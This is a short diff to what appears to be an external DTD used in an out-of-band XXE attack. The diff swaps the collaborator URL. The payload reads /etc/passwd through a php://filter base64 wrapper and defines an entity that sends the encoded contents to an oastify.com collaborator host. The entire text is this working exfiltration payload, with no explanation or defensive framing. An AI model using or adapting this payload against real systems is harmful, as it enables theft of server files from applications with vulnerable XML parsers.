@@ -1,3 +1,3 @@
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % all "<!ENTITY &#x25; exfil SYSTEM 'http://2nqtjvge0uxhog1spkwl3jjf268ywokd.oastify.com/?data=%file;'>">
+<!ENTITY % all "<!ENTITY &#x25; exfil SYSTEM 'https://jviarcov8b5ywx99x142b0rwangf47sw.oastify.com/?data=%file;'>">
 %all;
